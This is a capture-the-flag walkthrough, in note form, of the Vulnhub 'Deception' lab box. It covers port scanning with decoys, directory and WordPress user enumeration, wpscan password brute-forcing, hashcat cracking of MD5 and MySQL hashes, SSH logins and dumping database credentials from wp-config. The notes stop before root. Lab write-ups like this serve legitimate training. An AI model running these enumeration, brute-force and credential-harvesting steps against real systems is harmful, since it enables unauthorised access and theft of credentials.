@@ -1,0 +1,453 @@
+Vulnhub Deception Box
+
+Scans:
+
+sudo arp-scan -l -v
+Target grabbed 192.168.1.77
+
+ports: 22, 80
+
+Apache2 server 
+Ubuntu 2016
+ 
+ sudo nmap -sX -p- -D 1.1.1.1 192.168.1.77 -oX xmasScan1 
+
+ Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 23:22 CDT
+Nmap scan report for 192.168.1.77
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE         SERVICE
+22/tcp open|filtered ssh
+80/tcp open|filtered http
+MAC Address: 08:00:27:58:85:6E (Oracle VirtualBox virtual NIC)
+
+Nmap done: 1 IP address (1 host up) scanned in 2.42 seconds
+
+sudo gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 45 -x php,html,txt -o gobustedirmedium -u http://192.168.1.77
+
+/wordpress            (Status: 301) [Size: 316] [--> http://192.168.1.77/wordpress/]
+/javascript           (Status: 301) [Size: 317] [--> http://192.168.1.77/javascript/]
+/phpmyadmin           (Status: 301) [Size: 317] [--> http://192.168.1.77/phpmyadmin/]
+
+http://192.168.1.77/wordpress/robots.txt
+answer=allow : /robots.html
+
+http://192.168.1.77/wordpress/robots.html/
+answer = 
+<html>
+<body>
+<script>
+var count = 1;
+function myFunction() {
+  if (count<15) {
+    var input = document.getElementById("uname").value;
+    alert("clicks left for noob "+ input +":"+ (50-count));
+    count++;
+  }
+  else {
+   window.location="admindelete.html";  <------------ go over there
+  }
+};
+</script>
+  <input type="text" id="uname" placeholder="your name"</input>
+  <br>
+  <button onclick="myFunction()">show quest</button>
+</body>
+</html>
+
+http://192.168.1.77/wordpress/admindelete.html
+answer=
+<html>
+<body>
+<p>LOL,A Noob is looking for a hint</p>
+</body>
+</html>
+
+http://192.168.1.77/wordpress/hint.html/
+answer=
+<html>
+
+<body>
+
+<p>Please collect all the API tokens availabe on the home page</p>
+
+</body>
+
+</html>
+
+
+
+APIs:
+old0: 5F4DCC3B5AA
+old2 327DEB
+old1 765D61D8
+new  882CF99
+
+MD5 HASH
+5F4DCC3B5AA765D61D8327DEB882CF99
+
+
+
+HASHCAT
+hashcat -O -m 0 -a 3 -i hashfromapis.txt --increment-min 9 ?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l?l -w 3
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 0 (MD5)
+Hash.Target......: 5f4dcc3b5aa765d61d8327deb882cf99
+Time.Started.....: Wed Oct 26 01:28:23 2022 (0 secs)
+Time.Estimated...: Wed Oct 26 01:28:23 2022 (0 secs)
+Kernel.Feature...: Optimized Kernel
+Guess.Mask.......: ?l?l?l?l?l?l?l?l [8]
+Guess.Queue......: 7/11 (63.64%)
+Speed.#1.........: 22935.7 MH/s (75.75ms) @ Accel:256 Loops:1024 Thr:256 Vec:8
+Speed.#2.........:   947.6 MH/s (12.67ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
+Speed.#*.........: 23883.3 MH/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 5865701376/208827064576 (2.81%)
+Rejected.........: 0/5865701376 (0.00%)
+Restore.Point....: 0/11881376 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:2048-3072 Iteration:0-1024
+Restore.Sub.#2...: Salt:0 Amplifier:1024-2048 Iteration:0-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: oroerane -> bctlkkas
+Candidates.#2....: rlawgalo -> visczjos
+Hardware.Mon.#1..: Temp: 63c Fan: 31% Util:100% Core:1912MHz Mem:7300MHz Bus:16
+Hardware.Mon.#2..: Temp: 53c Util: 69%
+
+Started: Wed Oct 26 01:28:16 2022
+Stopped: Wed Oct 26 01:28:24 2022
+
+5f4dcc3b5aa765d61d8327deb882cf99:password
+
+MYSQLADMIN
+user haclabs@localhost
+first tried 
+ #1045 - Access denied for user 'haclabs'@'localhost' (using password: YES)
+ mysqli_real_connect(): (HY000/1045): Access denied for user 'haclabs'@'localhost' (using password: YES)
+sudo wpscan -U wrdlistusers.txt -P /usr/share/wordlists/fasttrack.txt --url http://192.168.1.77/wordpress/
+
+sudo wpscan --url http://192.168.1.77/wordpress/ -e u 
+
+ yash
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+
+[+] haclabs
+ | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
+ | Confirmed By: Login Error Messages (Aggressive Detection)
+ 
+ Login through ssh open port 22
+ user:yash
+ pass: 5F4DCC3B5AA765D61D8327DEB882CF99
+ 
+ flag1: 71C480DF93D6AE2F1EFAD1447C66C9525E316218CF51FC8D9ED832F2DAF18B73
+
+wget wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+
+python linuxprivchecker.py -w -o linuxprivchecker.log
+
+Default ssl conf  password xxj31ZMTZzkVA
+
+"==============================================================================
+
+Systemlog file is hideen on user yash home folder and flag1 , cat out the 
+systemlog file
+
+.systemlogs | tr '"' '\n'
+
+ssdsdsdsdsdqwertyuiopasdfghjklzxcvbnmqwertyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklqwertyuiop1234567890qazxdswedcfrfgvbhyyhnkiollokmkijnjuyhbhytgvfrdcxdesxzsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklzaq123456vfr4567890mnbvcde4567890yuiopasdfghjklzxcvbnmzxcvbnmasdfghjklmnbvcxzsaq234567890-098765rewsxcvbnm,lpoiuytresxcbnmkoiuytredcyuiopasdfghjklzxcvbnmzxcvbnmasdfghjk!@#$dfkdfjdkfjdf!@#$fdjferheirdfdfksdjhfsg24356789yuiopasdfghjklzxcvbnmzxcvbnmasdfghjkljdfivnd
+haclabs
+jsdskdjskdjsldsklfjlkfdgl/dsfgkdhfgkdfgdjfhkagdhkdhgkkdzfkgdhfffgkhsfhgkdfhgkjlsfladjsflslfjlaaakjdflkaejflyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklNDmsfmbwebrm43564576nu4r50q824305485103601856035860020^&*()sdjfsdflsdfaldjfleragkrjgkfdghdfhksjdhgsghkskskfskgkshkshksfhkgkrtho43euvnd,m,mnhjkjhgfdrtfghj,;poiuytgbvftyhjkllksjhgdfrteuyue
+A=123456789
+fdsgfhndsffjladjksfjlsdfjlfghfieruyiehgkfnjuyhbvcftyu789876543wsxcvbnm,mju76543asxcferfgbnm,klokjhgbvcxsdfklsdfweri34o58uwotueagsdgjlyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklwlarqlewairp3wi4te0596q03496tiquieljkgrelrsjto5euyjgeldfhqowe5uy4seyjelsdglsoh45yeujhskehgesjhgsyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldsklflssldfjlsdfjsldfjsldfjld
++A[::-1]
+fjlsdnvsldvnsujnhgfqwertyuioplkjhgfdsazxcvbnm,mnbvcxzasdfghjkl;poiuytrewqazxsedcvftghnklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjklyuiopasdfghjklzxcvbnmzxcvbnmasdfghjkldjfkdslfjsldfjsldfjlw4o32894829348293489289389
+
+We can see User "haclabs" and what it reads as an array with A=123456789 and +A[::-1] 
+its saying that is reversed it can be reversed by simple reading but lets use python REPL:
+
+Python 2.7.17 (default, Jul  1 2022, 15:56:32) 
+[GCC 7.5.0] on linux2
+Type "help", "copyright", "credits" or "license" for more information.
+>>> array = 123456789
+>>> array = [1,2,3,4,5,6,7,8,9]
+>>> print("Array before Reverse is :",array)
+('Array before Reverse is :', [1, 2, 3, 4, 5, 6, 7, 8, 9])
+>>> array.reverse()
+>>> print("Array reversed is :",array)
+('Array reversed is :', [9, 8, 7, 6, 5, 4, 3, 2, 1])
+
+Results:
+User haclabs
+Password: haclabs987654321
+
+"==============================================================================
+No luch on wordpress login and myphpadmin so its the SSH credentials:
+
+ssh haclabs@192.168.1.120
+password: haclabs987654321
+
+ls 
+changetheworld  Desktop  Documents  Downloads  flag2.txt  gen.py  haclabs.py  Music  Pictures  Public  Templates  Videos
+
+flag2.txt:
+c2Vjb25kIGZsYWcgOiBGQkM5NDQ2MDExQ0Y1QjE5OEVEOTU5NkNFRkJDNzlCQgpCdXQgc3RpbGwgaXQgaXMgbm9vT0JCIQo=
+
+It seems as BASE64, decode the string:
+
+cat flag2.txt | base64 -d 
+
+result:
+second flag : FBC9446011CF5B198ED9596CEFBC79BB
+But still it is nooOBB!
+
+"==============================================================================
+
+There are 2 python scripts on user home gen.py and haclabs.py
+
+gen.py :
+def encryption(ch, n):
+    return chr((ord(ch) + ord(n)) % 128)
+
+
+def decryption(ch, n):
+    return chr((ord(ch) + (128 - ord(n))) % 128)
+
+
+x = input("Enter text to be encrypted : ")
+n = input("Enter the key to be used : ")
+enc = ""
+dec = ""
+print("Encrypted")
+inc = 0
+for i in x:
+    enc = enc + encryption(i, n[inc%len(n)])
+    inc=inc+1
+print("Encrypted message : ["+ enc+"]")
+print("Decrypted")
+inc=0
+for i in enc:
+    dec = dec + decryption(i, n[inc%len(n)])
+    inc=inc+1
+print("Decrypted message : ", dec)
+
+
+haclabs.py :
+import random,os
+secret = random.randint(1,500)
+print "Pick a number between 1 to 500"
+f=0
+while True:
+    res = input("Guess the number: ")
+    if res==secret:
+        f=1
+        break
+    else:
+        print "You lose"
+        continue
+if f==1:
+	print "a new directory is created with name changetheworld"
+	os.system('mkdir changetheworld;cd changetheworld;touch changetheworld')
+
+
+"==============================================================================
+
+CD to /var/www/html/wordpress/
+
+Method 1
+
+$ cat wp-config.php | grep DB
+
+define( 'DB_NAME', 'wordpress' );
+define( 'DB_USER', 'wordpressuser' );
+define( 'DB_PASSWORD', 'cry4moon' );
+define( 'DB_HOST', 'localhost' );
+define( 'DB_CHARSET', 'utf8' );
+define( 'DB_COLLATE', '' );
+
+In place acces mysql and and drag all users and password strings from DB:
+
+mysql> select user, authentication_string from mysql.user;
++------------------+-------------------------------------------+
+| user             | authentication_string                     |
++------------------+-------------------------------------------+
+| root             |                                           |
+| mysql.session    | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+| mysql.sys        | *THISISNOTAVALIDPASSWORDTHATCANBEUSEDHERE |
+| debian-sys-maint | *2A702E4018EF99C245B5DC4E753531720BDC94E0 |
+| haclabs          | *1565CEE976A27D283F4ECF1EC2AEE11E71C8D208 |
+| phpmyadmin       | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |
+| wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |
+| wordpress        | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |
+| wordpressuser    | *4A247A535BAD910307E7DAA7A32A65C2A86D91AC |
++------------------+-------------------------------------------+
+9 rows in set (0.01 sec)
+
+Method 2
+
+$ cat wp-config.php | grep password -C 3
+
+/** MySQL database username */
+define( 'DB_USER', 'wordpressuser' );
+
+/** MySQL database password */
+define( 'DB_PASSWORD', 'cry4moon' );
+
+/** MySQL hostname */
+
+"==============================================================================
+
+No root Password visible but haclabs user MYSQL hash of the password
+is visible, crack time! :
+
+$ hash-identifier 4A247A535BAD910307E7DAA7A32A65C2A86D91AC
+
+ 2
+/usr/share/hash-identifier/hash-id.py:13: DeprecationWarning: invalid escape sequence '\ '
+  logo='''   #########################################################################
+   #########################################################################
+   #     __  __                     __           ______    _____           #
+   #    /\ \/\ \                   /\ \         /\__  _\  /\  _ `\         #
+   #    \ \ \_\ \     __      ____ \ \ \___     \/_/\ \/  \ \ \/\ \        #
+   #     \ \  _  \  /'__`\   / ,__\ \ \  _ `\      \ \ \   \ \ \ \ \       #
+   #      \ \ \ \ \/\ \_\ \_/\__, `\ \ \ \ \ \      \_\ \__ \ \ \_\ \      #
+   #       \ \_\ \_\ \___ \_\/\____/  \ \_\ \_\     /\_____\ \ \____/      #
+   #        \/_/\/_/\/__/\/_/\/___/    \/_/\/_/     \/_____/  \/___/  v1.2 #
+   #                                                             By Zion3R #
+   #                                                    www.Blackploit.com #
+   #                                                   Root@Blackploit.com #
+   #########################################################################
+--------------------------------------------------
+
+Possible Hashs:
+[+] SHA-1
+[+] MySQL5 - SHA-1(SHA-1($pass))
+
+Least Possible Hashs:
+[+] Tiger-160
+[+] Haval-160
+[+] RipeMD-160
+[+] SHA-1(HMAC)
+[+] Tiger-160(HMAC)
+[+] RipeMD-160(HMAC)
+[+] Haval-160(HMAC)
+[+] SHA-1(MaNGOS)
+[+] SHA-1(MaNGOS2)
+[+] sha1($pass.$salt)
+[+] sha1($salt.$pass)
+[+] sha1($salt.md5($pass))
+[+] sha1($salt.md5($pass).$salt)
+[+] sha1($salt.sha1($pass))
+[+] sha1($salt.sha1($salt.sha1($pass)))
+[+] sha1($username.$pass)
+[+] sha1($username.$pass.$salt)
+[+] sha1(md5($pass))
+[+] sha1(md5($pass).$salt)
+[+] sha1(md5(sha1($pass)))
+[+] sha1(sha1($pass))
+[+] sha1(sha1($pass).$salt)
+[+] sha1(sha1($pass).substr($pass,0,3))
+[+] sha1(sha1($salt.$pass))
+[+] sha1(sha1(sha1($pass)))
+[+] sha1(strtolower($username).$pass)
+
+nano haclabshash.txt
+1565CEE976A27D283F4ECF1EC2AEE11E71C8D208
+
+hashcat -m 300 -a 3 -i haclabshash.txt --increment-min 2 -1 ?d?l ?1?1?1?1?1?1?1?1?1?1?1 -w 3
+
+1565cee976a27d283f4ecf1ec2aee11e71c8d208:crymoon          
+                                                          
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 300 (MySQL4.1/MySQL5)
+Hash.Target......: 1565cee976a27d283f4ecf1ec2aee11e71c8d208
+Time.Started.....: Wed Oct 26 21:00:29 2022 (0 secs)
+Time.Estimated...: Wed Oct 26 21:00:29 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?1?1?1?1?1?1?1 [7]
+Guess.Charset....: -1 ?d?l, -2 Undefined, -3 Undefined, -4 Undefined 
+Guess.Queue......: 6/10 (60.00%)
+Speed.#1.........:  2876.0 MH/s (80.84ms) @ Accel:32 Loops:1024 Thr:256 Vec:1
+Speed.#2.........:   163.9 MH/s (76.56ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
+Speed.#*.........:  3039.9 MH/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1497366528/78364164096 (1.91%)
+Rejected.........: 0/1497366528 (0.00%)
+Restore.Point....: 0/1679616 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:6144-7168 Iteration:0-1024
+Restore.Sub.#2...: Salt:0 Amplifier:6144-7168 Iteration:0-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: vfid299 -> cppzn14
+Candidates.#2....: vfieran -> cppkpsa
+Hardware.Mon.#1..: Temp: 61c Fan:  0% Util:100% Core:1912MHz Mem:7300MHz Bus:16
+Hardware.Mon.#2..: Temp: 58c Util: 81%
+
+Started: Wed Oct 26 21:00:04 2022
+Stopped: Wed Oct 26 21:00:30 2022
+
+
+Second hash 
+
+4a247a535bad910307e7daa7a32a65c2a86d91ac:cry4moon
+
+Session..........: hashcat
+Status...........: Cracked
+Hash.Mode........: 300 (MySQL4.1/MySQL5)
+Hash.Target......: 4a247a535bad910307e7daa7a32a65c2a86d91ac
+Time.Started.....: Wed Oct 26 21:11:33 2022 (1 sec)
+Time.Estimated...: Wed Oct 26 21:11:34 2022 (0 secs)
+Kernel.Feature...: Pure Kernel
+Guess.Mask.......: ?1?1?1?1?1?1?1?1 [8]
+Guess.Charset....: -1 ?d?l, -2 Undefined, -3 Undefined, -4 Undefined 
+Guess.Queue......: 7/10 (70.00%)
+Speed.#1.........:  2839.0 MH/s (81.89ms) @ Accel:32 Loops:1024 Thr:256 Vec:1
+Speed.#2.........:   163.4 MH/s (76.81ms) @ Accel:1024 Loops:1024 Thr:1 Vec:8
+Speed.#*.........:  3002.4 MH/s
+Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
+Progress.........: 1497366528/2821109907456 (0.05%)
+Rejected.........: 0/1497366528 (0.00%)
+Restore.Point....: 0/60466176 (0.00%)
+Restore.Sub.#1...: Salt:0 Amplifier:6144-7168 Iteration:0-1024
+Restore.Sub.#2...: Salt:0 Amplifier:6144-7168 Iteration:0-1024
+Candidate.Engine.: Device Generator
+Candidates.#1....: vfierane -> cppgqvy1
+Candidates.#2....: vfi3qvy1 -> cppzn145
+Hardware.Mon.#1..: Temp: 70c Fan: 60% Util:100% Core:1882MHz Mem:7300MHz Bus:16
+Hardware.Mon.#2..: Temp: 68c Util: 80%
+
+Started: Wed Oct 26 21:10:57 2022
+Stopped: Wed Oct 26 21:11:35 2022
+
+"==============================================================================
+
+
+
+
+
+
+
+
+
+
+
+
+"==============================================================================
+
+
+"==============================================================================
+
+
+
+
+"==============================================================================
+
+
+
+
+"==============================================================================
+
+
+
+"==============================================================================
